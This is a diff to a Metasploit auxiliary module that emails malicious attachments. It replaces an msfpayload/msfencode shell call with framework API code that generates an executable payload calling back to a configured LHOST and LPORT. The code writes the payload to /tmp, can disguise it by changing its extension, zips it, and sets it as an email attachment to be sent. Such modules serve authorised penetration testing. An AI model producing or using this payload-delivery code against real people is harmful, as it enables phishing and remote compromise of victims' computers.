@@ -73,7 +73,6 @@ class Metasploit3 < Msf::Auxiliary
         msf_port        = yamlconf['msf_port']
         msf_ip          = yamlconf['msf_ip']
         msf_payload     = yamlconf['msf_payload']
-        msf_location    = yamlconf['msf_location']
         msf_filename    = yamlconf['msf_filename']
         msf_change_ext  = yamlconf['msf_change_ext']
         msf_payload_ext = yamlconf['msf_payload_ext']
@@ -90,30 +89,48 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
         if  make_payload
+			print_status("Creating payload...")
+			mod = framework.payloads.create(msf_payload)
+			if (mod)
+				# By not passing an explicit encoder, we're asking the
+				# framework to pick one for us.  In general this is the best
+				# way to encode.
+				buf = mod.generate_simple(
+						'Format'  => 'raw',
+						'Options' => { "LHOST"=>msf_ip, "LPORT"=>msf_port }
+					)
+				exe = Msf::Util::EXE.to_executable(framework, mod.arch, mod.platform, buf)
+				p mod
+				p mod.arch
+				p mod.platform
+				print_status("Writing payload to #{msf_filename}")
+				File.open("/tmp/#{msf_filename}", "wb") do |f|
+					f.write(exe)
+				end
+			else
+				print_error("Failed to create payload, #{msf_payload}")
+				return
+			end
 
-            print_status("Creating payload...")
-            system(
-                "#{msf_location}/msfpayload #{msf_payload} LHOST=#{msf_ip} LPORT=#{msf_port} R | #{msf_location}/msfencode -t exe -o /tmp/#{msf_filename} > /dev/null 2>&1")
+			if msf_change_ext
+				msf_payload_newext = msf_filename
+				msf_payload_newext = msf_payload_newext.sub(/\.\w+$/, ".#{msf_payload_ext}")
+				File.rename("/tmp/#{msf_filename}", "/tmp/#{msf_payload_newext}")
+				msf_filename = msf_payload_newext
+			end
 
-            if msf_change_ext
-                msf_payload_newext = msf_filename
-                msf_payload_newext = msf_payload_newext.sub(/\.\w+$/, ".#{msf_payload_ext}")
-                File.rename("/tmp/#{msf_filename}", "/tmp/#{msf_payload_newext}")
-                msf_filename = msf_payload_newext
-            end
+			if zip_payload
+				zip_file = msf_filename
+				zip_file = zip_file.gsub(/\.\w+/, '.zip')
+				system("zip -r /tmp/#{zip_file} /tmp/#{msf_filename} > /dev/null 2>&1");
+				msf_filename         = zip_file
+				attachment_file_type = 'application/zip'
+			else
+				attachment_file_type = 'application/exe'
+			end
 
-            if zip_payload
-                zip_file = msf_filename
-                zip_file = zip_file.gsub(/\.\w+/, '.zip')
-                system("zip -r /tmp/#{zip_file} /tmp/#{msf_filename} > /dev/null 2>&1");
-                msf_filename         = zip_file
-                attachment_file_type = 'application/zip'
-            else
-                attachment_file_type = 'application/exe'
-            end
-
-            attachment_file = "/tmp/#{msf_filename}"
-            attachment_file_name = msf_filename
+			attachment_file = "/tmp/#{msf_filename}"
+			attachment_file_name = msf_filename
         end
 
 
@@ -165,4 +182,5 @@ class Metasploit3 < Msf::Auxiliary
 
 		print_status("Email sent..")
 	end
+
 end
